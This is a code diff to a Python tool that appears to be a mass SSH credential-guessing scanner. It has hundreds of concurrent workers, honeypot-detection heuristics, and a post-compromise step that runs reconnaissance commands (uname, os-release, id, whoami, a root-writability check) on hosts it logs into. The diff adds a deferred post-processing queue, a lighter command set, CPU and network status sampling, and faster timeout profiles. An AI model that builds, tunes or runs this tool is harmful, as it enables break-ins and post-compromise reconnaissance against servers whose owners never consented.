@@ -56,12 +56,18 @@ class Config:
     results_path: Path = Path("results.jsonl")
     log_interval: float = 5.0
     hang_timeout: float = 60.0  # seconds with no progress before declaring hang (0 disables)
+    status_interval: float = 1.0  # cadence for status line updates
+    cpu_net_interval: float = 5.0  # cadence for local cpu/net sampling
     verbose: bool = False
     require_ssh_banner: bool = True  # drop non-SSH listeners during probe unless disabled
     gather_info: bool = False
     honeypot_detect: bool = True
     post_timeout: float = 5.0  # seconds budget for post-compromise info gathering
     age_cache: Optional[Path] = None
+    gather_concurrency: int = 20
+    post_process: bool = True  # run enrichment in a post phase instead of inline
+    post_light: bool = False  # collect lighter info set
+    cpu_net: bool = True  # enable cpu/net sampling in status
     require_ssh_banner: bool = True  # drop non-SSH listeners during probe unless disabled
 
 
@@ -358,16 +364,25 @@ async def gather_info(
             ssh_info["banner"] = host_state.banner
         info["ssh"] = ssh_info
 
-        sysinfo_cmds = {
-            "uname": "uname -a",
-            "os_release": "cat /etc/os-release",
-            "load": "cat /proc/loadavg",
-            "mem": "cat /proc/meminfo",
-            "disk": "df -P /",
-            "uptime": "cat /proc/uptime",
-            "id": "id -u; whoami; test -w /root && echo root_writable || echo root_not_writable",
-            "nproc": "nproc",
-        }
+        if cfg.post_light:
+            sysinfo_cmds = {
+                "uname": "uname -a",
+                "os_release": "cat /etc/os-release",
+                "load": "cat /proc/loadavg",
+                "uptime": "cat /proc/uptime",
+                "id": "id -u; whoami; test -w /root && echo root_writable || echo root_not_writable",
+            }
+        else:
+            sysinfo_cmds = {
+                "uname": "uname -a",
+                "os_release": "cat /etc/os-release",
+                "load": "cat /proc/loadavg",
+                "mem": "cat /proc/meminfo",
+                "disk": "df -P /",
+                "uptime": "cat /proc/uptime",
+                "id": "id -u; whoami; test -w /root && echo root_writable || echo root_not_writable",
+                "nproc": "nproc",
+            }
 
         cmd_results: Dict[str, Any] = {}
         lost = False
@@ -471,6 +486,8 @@ async def attempt_login(
     stats_lock: asyncio.Lock,
     state: Dict[str, Any],
     state_lock: asyncio.Lock,
+    gather_sem: asyncio.Semaphore,
+    post_queue: "asyncio.Queue[dict]",
 ) -> None:
     if global_stop.is_set() or host_state.stop.is_set():
         return
@@ -544,14 +561,21 @@ async def attempt_login(
         if host_state.banner:
             record["banner"] = host_state.banner
 
-        if cfg.gather_info:
-            extra = await gather_info(conn, cfg, host_state, state, state_lock)
-            record.update(extra)
-
-        async with file_lock:
-            cfg.results_path.parent.mkdir(parents=True, exist_ok=True)
-            with cfg.results_path.open("a", encoding="utf-8") as f:
-                f.write(dumps_json(record) + "\n")
+        if cfg.gather_info and cfg.post_process:
+            await post_queue.put(record)
+        elif cfg.gather_info:
+            async with gather_sem:
+                extra = await gather_info(conn, cfg, host_state, state, state_lock)
+                record.update(extra)
+            async with file_lock:
+                cfg.results_path.parent.mkdir(parents=True, exist_ok=True)
+                with cfg.results_path.open("a", encoding="utf-8") as f:
+                    f.write(dumps_json(record) + "\n")
+        else:
+            async with file_lock:
+                cfg.results_path.parent.mkdir(parents=True, exist_ok=True)
+                with cfg.results_path.open("a", encoding="utf-8") as f:
+                    f.write(dumps_json(record) + "\n")
 
         async with stats_lock:
             stats["successes"] += 1
@@ -573,6 +597,8 @@ async def worker(
     stats_lock: asyncio.Lock,
     state: Dict[str, Any],
     state_lock: asyncio.Lock,
+    gather_sem: asyncio.Semaphore,
+    post_queue: "asyncio.Queue[dict]",
 ) -> None:
     while True:
         item = await queue.get()
@@ -590,7 +616,19 @@ async def worker(
         async with stats_lock:
             stats["active"] += 1
         try:
-            await attempt_login(item, cfg, host_states[item.host], global_stop, file_lock, stats, stats_lock, state, state_lock)
+            await attempt_login(
+                item,
+                cfg,
+                host_states[item.host],
+                global_stop,
+                file_lock,
+                stats,
+                stats_lock,
+                state,
+                state_lock,
+                gather_sem,
+                post_queue,
+            )
         except Exception as exc:
             async with stats_lock:
                 stats["errors"] += 1
@@ -712,10 +750,69 @@ async def progress_reporter(
     queue: "asyncio.Queue[Optional[WorkItem]]",
     stop: asyncio.Event,
     global_stop: asyncio.Event,
+    post_queue: "asyncio.Queue[dict]",
 ) -> None:
     start_time = time.monotonic()
 
+    def read_cpu() -> Optional[Tuple[int, int]]:
+        try:
+            with open("/proc/stat", "r", encoding="utf-8") as f:
+                parts = f.readline().strip().split()
+            if not parts or parts[0] != "cpu":
+                return None
+            vals = list(map(int, parts[1:]))
+            idle = vals[3] + (vals[4] if len(vals) > 4 else 0)
+            total = sum(vals)
+            return idle, total
+        except Exception:
+            return None
+
+    def read_net() -> Optional[Tuple[int, int]]:
+        try:
+            rx = tx = 0
+            with open("/proc/net/dev", "r", encoding="utf-8") as f:
+                lines = f.readlines()[2:]
+            for line in lines:
+                if ":" not in line:
+                    continue
+                iface, data = line.split(":", 1)
+                iface = iface.strip()
+                if iface == "lo":
+                    continue
+                parts = data.split()
+                if len(parts) >= 16:
+                    rx += int(parts[0])
+                    tx += int(parts[8])
+            return rx, tx
+        except Exception:
+            return None
+
+    prev_cpu = read_cpu()
+    prev_net = read_net()
+    prev_sample_t = time.monotonic()
+    cpu_percent: Optional[float] = None
+    net_rates: Tuple[Optional[float], Optional[float]] = (None, None)
+
     async def snapshot(now: float) -> str:
+        nonlocal prev_cpu, prev_net, prev_sample_t, cpu_percent, net_rates
+
+        if now - prev_sample_t >= cfg.cpu_net_interval:
+            cpu_now = read_cpu()
+            net_now = read_net()
+            if cpu_now and prev_cpu:
+                idle_d = cpu_now[0] - prev_cpu[0]
+                total_d = cpu_now[1] - prev_cpu[1]
+                if total_d > 0:
+                    cpu_percent = max(0.0, min(100.0, (1 - idle_d / total_d) * 100))
+            if net_now and prev_net:
+                delta_t = now - prev_sample_t
+                rx_rate = (net_now[0] - prev_net[0]) * 8 / delta_t / 1000  # kbps
+                tx_rate = (net_now[1] - prev_net[1]) * 8 / delta_t / 1000
+                net_rates = (max(rx_rate, 0), max(tx_rate, 0))
+            prev_cpu = cpu_now or prev_cpu
+            prev_net = net_now or prev_net
+            prev_sample_t = now
+
         async with stats_lock:
             attempts = int(stats.get("attempts", 0))
             successes = int(stats.get("successes", 0))
@@ -732,34 +829,49 @@ async def progress_reporter(
         rate = attempts / elapsed if elapsed > 0 else 0.0
         success_rate = successes / attempts if attempts else 0.0
         qsize = queue.qsize()
-        lines = [
-            "[status]",
-            f"  elapsed: {elapsed:.1f}s | rate: {rate:.2f}/s | idle: {idle:.1f}s",
-            f"  queue: {qsize} | pending-est: {pending} | active: {active}/{cfg.max_workers}",
-            f"  attempts: {attempts}/{total} | successes: {successes} | failures: {failures} | skipped: {skipped} | errors: {errors}",
-            f"  success-rate: {success_rate:.2%}",
+        cpu_str = f"{cpu_percent:.1f}%" if (cfg.cpu_net and cpu_percent is not None) else "n/a"
+        rx_str = f"{net_rates[0]:.1f}" if (cfg.cpu_net and net_rates[0] is not None) else "n/a"
+        tx_str = f"{net_rates[1]:.1f}" if (cfg.cpu_net and net_rates[1] is not None) else "n/a"
+        post_pending = post_queue.qsize() if cfg.gather_info and cfg.post_process else 0
+        parts = [
+            f"\r[status] elapsed {elapsed:.1f}s",
+            f"rate {rate:.2f}/s",
+            f"idle {idle:.1f}s",
+            f"queue {qsize}",
+            f"pending~{pending}",
+            f"active {active}/{cfg.max_workers}",
+            f"attempts {attempts}/{total}",
+            f"succ {successes}",
+            f"fail {failures}",
+            f"skip {skipped}",
+            f"err {errors}",
+            f"success-rate {success_rate:.2%}",
+            f"cpu {cpu_str}",
+            f"net {rx_str}/{tx_str} kbps",
         ]
-        return "\n".join(lines)
+        if post_pending:
+            parts.append(f"post {post_pending}")
+        return " | ".join(parts)
 
-    # Print immediately so users see status even before the first interval elapses.
-    print(await snapshot(time.monotonic()), flush=True)
+    print(await snapshot(time.monotonic()), end="", flush=True)
 
     while not stop.is_set():
-        await asyncio.sleep(cfg.log_interval)
+        await asyncio.sleep(min(cfg.status_interval, cfg.log_interval))
         now = time.monotonic()
-        print(await snapshot(now), flush=True)
+        print(await snapshot(now), end="", flush=True)
 
         async with stats_lock:
             idle = now - stats.get("last_progress", start_time)
             pending_now = max(stats.get("total", 0) - (stats.get("attempts", 0) + stats.get("skipped", 0)), 0)
         if cfg.hang_timeout > 0 and idle > cfg.hang_timeout and pending_now > 0:
             print(
-                f"[hang] No progress for {idle:.1f}s (threshold {cfg.hang_timeout}s). Draining queue and signaling stop.",
+                f"\n[hang] No progress for {idle:.1f}s (threshold {cfg.hang_timeout}s). Draining queue and signaling stop.",
                 flush=True,
             )
             stop.set()
             global_stop.set()
             drain_queue(queue)
+    print()
 
 
 async def run(cfg: Config) -> None:
@@ -768,11 +880,13 @@ async def run(cfg: Config) -> None:
 
     queue_size = max(0, cfg.queue_size)
     queue: "asyncio.Queue[Optional[WorkItem]]" = asyncio.Queue(maxsize=queue_size)
+    post_queue: "asyncio.Queue[dict]" = asyncio.Queue()
     global_stop = asyncio.Event()
     file_lock = asyncio.Lock()
     stats_lock = asyncio.Lock()
     state_lock = asyncio.Lock()
     state: Dict[str, Any] = {"age_cache": load_age_cache(cfg.age_cache)}
+    gather_sem = asyncio.Semaphore(max(1, cfg.gather_concurrency))
     stats: Dict[str, float] = {
         "attempts": 0,
         "successes": 0,
@@ -785,11 +899,25 @@ async def run(cfg: Config) -> None:
     }
 
     workers = [
-        asyncio.create_task(worker(queue, cfg, host_states, global_stop, file_lock, stats, stats_lock, state, state_lock))
+        asyncio.create_task(
+            worker(
+                queue,
+                cfg,
+                host_states,
+                global_stop,
+                file_lock,
+                stats,
+                stats_lock,
+                state,
+                state_lock,
+                gather_sem,
+                post_queue,
+            )
+        )
         for _ in range(cfg.max_workers)
     ]
     reporter_stop = asyncio.Event()
-    reporter = asyncio.create_task(progress_reporter(cfg, stats, stats_lock, queue, reporter_stop, global_stop))
+    reporter = asyncio.create_task(progress_reporter(cfg, stats, stats_lock, queue, reporter_stop, global_stop, post_queue))
 
     print("[info] Building work queue...", flush=True)
     await build_queue(cfg, queue, host_states, global_stop)
@@ -806,6 +934,9 @@ async def run(cfg: Config) -> None:
             w.cancel()
         with contextlib.suppress(Exception):
             await asyncio.gather(*workers)
+        if cfg.gather_info and cfg.post_process:
+            print("\n[info] Post-processing successes...", flush=True)
+            await run_post_processing(cfg, post_queue, host_states, file_lock, state, state_lock, gather_sem)
         with contextlib.suppress(Exception):
             save_age_cache(cfg.age_cache, state.get("age_cache", {}))
         with contextlib.suppress(Exception):
@@ -857,6 +988,10 @@ def build_parser() -> argparse.ArgumentParser:
     p.add_argument("--no-honeypot-detect", action="store_true", help="disable honeypot heuristics")
     p.add_argument("--post-timeout", type=float, default=5.0, help="timeout budget for post-auth info collection")
     p.add_argument("--age-cache", help="path to hostkey first-seen cache (json)")
+    p.add_argument("--gather-concurrency", type=int, default=20, help="max concurrent post-auth info tasks")
+    p.add_argument("--post-light", action="store_true", help="lightweight post-auth info (smaller command set)")
+    p.add_argument("--no-post-process", action="store_true", help="run gather-info inline instead of post phase")
+    p.add_argument("--no-cpu-net", action="store_true", help="disable CPU/net sampling in status")
     # Note: a short sanity command runs after auth to ensure the session can execute commands; failures are treated as auth failures.
     return p
 
@@ -872,12 +1007,14 @@ def main(argv: Optional[Sequence[str]] = None) -> None:
             "fast": {
                 "max_workers": 400,
                 "queue_size": 0,
-                "connect_timeout": 1.5,
-                "auth_timeout": 3.0,
+                "connect_timeout": 1.0,
+                "auth_timeout": 2.0,
                 "read_timeout": 2.0,
-                "log_interval": 3.0,
+                "log_interval": 2.0,
+                "status_interval": 1.0,
                 "hang_timeout": 45.0,
                 "gather_info": False,
+                "post_process": True,
             },
             "balanced": {
                 "max_workers": 250,
@@ -885,7 +1022,8 @@ def main(argv: Optional[Sequence[str]] = None) -> None:
                 "connect_timeout": 2.0,
                 "auth_timeout": 4.0,
                 "read_timeout": 3.0,
-                "log_interval": 4.0,
+                "log_interval": 3.0,
+                "status_interval": 1.0,
                 "hang_timeout": 60.0,
             },
             "info": {
@@ -895,9 +1033,11 @@ def main(argv: Optional[Sequence[str]] = None) -> None:
                 "auth_timeout": 5.0,
                 "read_timeout": 4.0,
                 "log_interval": 5.0,
+                "status_interval": 1.0,
                 "hang_timeout": 90.0,
                 "gather_info": True,
                 "post_timeout": 6.0,
+                "post_process": True,
             },
         }
         profile_vals = profiles.get(args.profile, {})
@@ -955,12 +1095,17 @@ def main(argv: Optional[Sequence[str]] = None) -> None:
         results_path=results_path,
         log_interval=args.log_interval,
         hang_timeout=args.hang_timeout,
+        status_interval=args.log_interval if args.log_interval else 1.0,
         verbose=args.verbose,
         require_ssh_banner=not args.allow_non_ssh,
         gather_info=args.gather_info,
         honeypot_detect=not args.no_honeypot_detect,
         post_timeout=args.post_timeout,
         age_cache=age_cache_path,
+        gather_concurrency=args.gather_concurrency,
+        post_light=args.post_light,
+        post_process=not args.no_post_process,
+        cpu_net=not args.no_cpu_net,
     )
 
     try:
